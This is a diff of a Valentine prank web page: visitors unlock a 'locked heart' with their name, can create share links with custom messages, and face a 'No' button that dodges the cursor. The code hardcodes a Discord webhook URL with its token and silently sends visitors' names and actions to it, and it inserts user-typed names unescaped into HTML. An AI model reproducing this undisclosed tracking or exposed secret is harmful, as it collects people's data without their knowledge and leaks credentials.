@@ -11,7 +11,6 @@
     :root { --primary: #ff4d6d; --secondary: #fbafba; --bg: #ffe6eb; }
     body { margin: 0; height: 100vh; font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; background: var(--bg); overflow: hidden; touch-action: none; }
 
-    /* Sunset Silhouette Background */
     #namePortal {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://images.unsplash.com/photo-1518199266791-5375a83190b7?q=80&w=2070&auto=format&fit=crop') no-repeat center center;
@@ -23,146 +22,108 @@
       border: 1px solid rgba(255, 255, 255, 0.2); padding: 40px 25px; border-radius: 30px; box-shadow: 0 10px 40px 0 rgba(0, 0, 0, 0.4); max-width: 420px; width: 85%;
     }
 
-    /* Viral Creator Modal UI - FIXED */
     .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center; z-index: 2000; backdrop-filter: blur(5px); }
-    
-    .custom-modal { 
-        background: white; 
-        padding: 30px; 
-        border-radius: 30px; 
-        width: 90%; 
-        max-width: 400px; 
-        text-align: center; 
-        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-    }
+    .custom-modal { background: white; padding: 30px; border-radius: 30px; width: 90%; max-width: 400px; text-align: center; display: flex; flex-direction: column; align-items: center; }
+    .modal-input, .modal-select { width: 100%; padding: 12px; margin: 8px 0; border: 2px solid var(--secondary); border-radius: 12px; outline: none; font-family: 'Poppins'; }
+    .primary-btn { background: var(--primary); color: white; border: none; padding: 15px 25px; border-radius: 50px; cursor: pointer; font-weight: 800; width: 100%; margin-top: 15px; }
 
-    .modal-input { 
-        width: 100%; 
-        padding: 15px; 
-        margin: 10px 0; 
-        border: 2px solid var(--secondary); 
-        border-radius: 15px; 
-        outline: none; 
-        box-sizing: border-box; 
-        font-family: 'Poppins', sans-serif;
-        font-size: 1rem;
-    }
-
-    .primary-btn { 
-        background: var(--primary); 
-        color: white; 
-        border: none; 
-        padding: 15px 25px; 
-        border-radius: 50px; 
-        cursor: pointer; 
-        font-weight: 800; 
-        width: 100%; 
-        margin-top: 15px; 
-        font-size: 1.1rem;
-        transition: 0.2s; 
-    }
-
-    .copy-box { background: #fdf2f4; padding: 12px; border-radius: 10px; margin: 15px 0; font-size: 0.75rem; word-break: break-all; border: 1px dashed var(--primary); color: #333; width: 100%; box-sizing: border-box;}
-
-    /* Game UI */
     .card { background: white; padding: 40px; width: 90vw; max-width: 450px; height: 550px; border-radius: 40px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); display: none; flex-direction: column; align-items: center; justify-content: space-between; position: relative; overflow: hidden; z-index: 10; }
-    #yes { background: var(--primary); color: white; font-size: 22px; font-weight: 700; padding: 15px 50px; border: none; border-radius: 50px; cursor: pointer; transition: transform 0.3s; }
     #no { background: var(--secondary); color: white; padding: 10px 25px; border: none; border-radius: 50px; position: absolute; z-index: 200; transition: top 0.3s, left 0.3s; cursor: pointer; }
+    #yes { background: var(--primary); color: white; font-size: 22px; font-weight: 700; padding: 15px 50px; border: none; border-radius: 50px; cursor: pointer; transition: transform 0.3s; }
   </style>
 </head>
 <body>
 
   <div id="modalOverlay" class="modal-overlay">
     <div class="custom-modal">
-      <h2 style="color: var(--primary); margin: 0 0 20px 0; font-weight: 800;">Create Your Link</h2>
-      
+      <h2 style="color: var(--primary); margin: 0 0 10px 0;">Create Your Link</h2>
       <div id="step1" style="width: 100%;">
-        <input type="text" id="creatorInput" class="modal-input" placeholder="Your Name">
-        <input type="text" id="targetInput" class="modal-input" placeholder="Their Name">
+        <input type="text" id="creatorInput" class="modal-input" placeholder="Your Name" oninput="updateSuggestions()">
+        <input type="text" id="targetInput" class="modal-input" placeholder="Their Name" oninput="updateSuggestions()">
+        
+        <select id="suggestionBox" class="modal-select" onchange="selectSuggestion()">
+          <option value="">✨ Suggested Messages...</option>
+        </select>
+        
+        <textarea id="msgInput" class="modal-input" placeholder="Custom message (optional)" rows="3"></textarea>
         <button class="primary-btn" onclick="processLinkGeneration()">Generate Link</button>
       </div>
-
       <div id="step2" style="display: none; width: 100%;">
-        <p style="font-size: 0.9rem; color: #555;">Link ready for <span id="displayTarget" style="font-weight: 800; color: var(--primary);"></span>!</p>
-        <div id="urlDisplay" class="copy-box"></div>
+        <p style="font-size: 0.9rem;">Ready for <span id="displayTarget" style="font-weight: 800; color: var(--primary);"></span>!</p>
+        <div id="urlDisplay" style="background:#fdf2f4; padding:10px; border-radius:10px; font-size:0.7rem; word-break:break-all; border:1px dashed var(--primary);"></div>
         <button class="primary-btn" id="copyBtn" onclick="copyGeneratedUrl()">Copy Link & Close</button>
       </div>
-
-      <p style="font-size: 0.8rem; color: #999; cursor: pointer; margin-top: 20px; font-weight: 600;" onclick="closeModal()">Maybe later</p>
+      <p style="font-size: 0.8rem; color: #999; cursor: pointer; margin-top: 15px;" onclick="closeModal()">Close</p>
     </div>
   </div>
 
   <div id="namePortal">
     <div class="glass-box">
-      <h1 style="color: white; font-weight: 800; margin-bottom: 20px;">My heart is locked.<br>Please enter the name of the key-holder...</h1>
-      <input type="text" id="userName" style="padding: 15px; border-radius: 50px; border: none; width: 80%; text-align: center; font-family: 'Poppins';" placeholder="Your name..." onkeydown="if(event.key==='Enter') startApp()">
+      <h1 id="introText" style="color: white; font-weight: 800;">My heart is locked.</h1>
+      <p id="customText" style="color:white; margin-bottom:20px; font-style: italic;"></p>
+      <input type="text" id="userName" style="padding: 15px; border-radius: 50px; border: none; width: 80%; text-align: center;" placeholder="Your name..." onkeydown="if(event.key==='Enter') startApp()">
       <button onclick="startApp()" style="background: var(--primary); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-weight: 800; cursor: pointer; margin-top: 20px;">Unlock My Heart</button>
-      <p style="color:white; font-size:0.75rem; margin-top:20px; opacity:0.8; cursor:pointer; text-decoration: underline;" onclick="openModal()">Create your own Valentine link</p>
+      <p style="color:white; font-size:0.75rem; margin-top:20px; opacity:0.8; cursor:pointer; text-decoration: underline;" onclick="openModal()">Create your own link</p>
     </div>
   </div>
 
   <div class="card" id="mainCard">
     <div id="joke-text" style="color:var(--primary); font-weight:800; text-transform:uppercase; font-size: 0.8rem;">CATCH ME! 😉</div>
-    <h1 style="color: var(--primary); font-weight: 800; text-align: center;">Will you be my Valentine? 🌹</h1>
+    <h1 id="valentineTitle" style="color: var(--primary); font-weight: 800; text-align: center;">Will you be my Valentine? 🌹</h1>
     <div style="flex-grow:1; display:flex; align-items:center;"><button id="yes" onclick="yesClick()">Yes</button></div>
     <button id="no">No</button>
   </div>
 
 <script>
-  let visitorName = "";
-  let clickCount = 0;
-  let yesScale = 1;
-  let startTime = null;
-  let generatedUrl = "";
+  let visitorName = "", clickCount = 0, yesScale = 1, generatedUrl = "";
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1468954384997023777/oL5KyCiivYCBUM3gI0_JWhkKiBV8t6ngFZjZbanUQ_XMUc2E2oWU1_OZw4u0eFfnax7A";
 
-  // Viral logic: Detect who shared the link
-  let sharedBy = new URLSearchParams(window.location.search).get('from') || null;
+  const params = new URLSearchParams(window.location.search);
+  let sharedBy = params.get('from'), customMsg = params.get('msg');
 
   window.onload = () => {
-    const params = new URLSearchParams(window.location.search);
-    const targetName = params.get('to');
-    if(targetName) document.getElementById('userName').value = targetName;
-    trackEvent(sharedBy ? `Opened Link (Shared by ${sharedBy})` : "Opened Direct Link");
+    if(params.get('to')) document.getElementById('userName').value = params.get('to');
+    if(customMsg) document.getElementById('customText').innerText = `"${decodeURIComponent(customMsg)}"`;
+    trackEvent(sharedBy ? `Opened (From ${sharedBy})` : "Opened Direct");
   };
 
-  async function trackEvent(event) {
-    let logData = { content: `🔄 **Valentine Report**\n**User:** ${visitorName || "Guest"}\n**Event:** ${event}` };
-    if (sharedBy) logData.content += `\n**Source:** Shared by ${sharedBy}`;
-    
-    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(logData) });
+  function updateSuggestions() {
+    const from = document.getElementById('creatorInput').value.trim() || "Me";
+    const to = document.getElementById('targetInput').value.trim() || "You";
+    const suggestions = [
+      `Hey ${to}, ${from} has a secret for you...`,
+      `${to}, will you make ${from} the happiest person?`,
+      `A special request from ${from} to ${to} ❤️`,
+      `${to}, you've been on ${from}'s mind all day.`,
+      `From ${from}'s heart, directly to ${to}.`,
+      `${to}, ${from} thinks you are incredible.`,
+      `Can ${from} be your Valentine, ${to}?`,
+      `${to}, ${from} is officially asking...`,
+      `Life is better with ${to}, says ${from}.`,
+      `To ${to}: You stolen ${from}'s heart!`
+    ];
+    const select = document.getElementById('suggestionBox');
+    select.innerHTML = '<option value="">✨ Suggested Messages...</option>' + 
+      suggestions.map(s => `<option value="${s}">${s}</option>`).join('');
   }
 
-  function startApp() {
-    const input = document.getElementById('userName');
-    if (!input.value.trim()) return;
-    visitorName = input.value.trim();
-    trackEvent("Heart Unlocked");
-    document.getElementById('namePortal').style.display = "none";
-    document.getElementById('mainCard').style.display = "flex";
-  }
-
-  /* MODAL LOGIC */
-  function openModal() { document.getElementById('modalOverlay').style.display = 'flex'; }
+  function selectSuggestion() { document.getElementById('msgInput').value = document.getElementById('suggestionBox').value; }
+  function openModal() { document.getElementById('modalOverlay').style.display = 'flex'; updateSuggestions(); }
   function closeModal() { document.getElementById('modalOverlay').style.display = 'none'; }
-  
+
   function processLinkGeneration() {
     const creator = document.getElementById('creatorInput').value.trim();
     const target = document.getElementById('targetInput').value.trim();
-    if (!creator || !target) { alert("Please fill both names!"); return; }
+    const msg = document.getElementById('msgInput').value.trim();
+    if (!creator || !target) return alert("Fill names first!");
     
     const base = window.location.href.split('?')[0];
-    generatedUrl = `${base}?from=${encodeURIComponent(creator)}&to=${encodeURIComponent(target)}`;
+    generatedUrl = `${base}?from=${encodeURIComponent(creator)}&to=${encodeURIComponent(target)}&msg=${encodeURIComponent(msg)}`;
     
     document.getElementById('step1').style.display = 'none';
     document.getElementById('step2').style.display = 'block';
     document.getElementById('displayTarget').innerText = target;
     document.getElementById('urlDisplay').innerText = generatedUrl;
-
-    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `🚀 **New Viral Link Created!**\n**Creator:** ${creator}\n**Target:** ${target}` }) });
   }
 
   function copyGeneratedUrl() {
@@ -172,8 +133,15 @@
     });
   }
 
+  function startApp() {
+    visitorName = document.getElementById('userName').value.trim();
+    if(!visitorName) return;
+    trackEvent("Heart Unlocked");
+    document.getElementById('namePortal').style.display = "none";
+    document.getElementById('mainCard').style.display = "flex";
+  }
+
   function moveNo() {
-    clickCount++;
     const card = document.getElementById("mainCard");
     const noBtn = document.getElementById("no");
     noBtn.style.left = (Math.random() * (card.clientWidth - 100)) + "px";
@@ -184,7 +152,11 @@
   function yesClick() {
     trackEvent("SAID YES! ❤️");
     confetti({ particleCount: 150, spread: 70 });
-    document.getElementById("mainCard").innerHTML = `<h1 style="color:var(--primary)">SUCCESS! ❤️</h1><button class="primary-btn" onclick="openModal()">Create Your Own</button>`;
+    document.getElementById("mainCard").innerHTML = `<h1 style="color:var(--primary)">SUCCESS! ❤️</h1><button class="primary-btn" onclick="openModal()" style="width: auto; padding: 10px 30px;">Create Your Own</button>`;
+  }
+
+  function trackEvent(event) {
+    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `🔄 **Valentine Update**\n**User:** ${visitorName || "Guest"}\n**Event:** ${event}` }) });
   }
 </script>
 </body>
